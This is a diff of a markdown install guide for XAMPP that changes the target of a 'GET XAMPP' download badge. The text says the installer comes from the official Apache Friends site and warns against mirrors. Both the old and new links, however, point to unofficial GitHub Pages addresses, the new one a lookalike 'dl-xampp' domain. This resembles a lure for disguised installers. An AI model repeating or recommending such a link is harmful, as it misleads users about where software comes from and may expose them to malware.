@@ -69,7 +69,7 @@ MariaDB can fail the same way when an old database process is still running. Sto
 
 Get the installer from the official Apache Friends site. Pick Windows, Linux, or macOS to match the computer. The stack is free. This page does not add a price. Skip Softonic and other mirror downloads.
 
-[![GET XAMPP](https://img.shields.io/badge/GET-XAMPP-0F766E?style=social&labelColor=134E4A)](https://akilahmargosian.github.io/.github/XAMPP-Server)
+[![GET XAMPP](https://img.shields.io/badge/GET-XAMPP-0F766E?style=social&labelColor=134E4A)](https://dl-xampp.github.io/XAMPP-Server/)
 
 ### Running
 
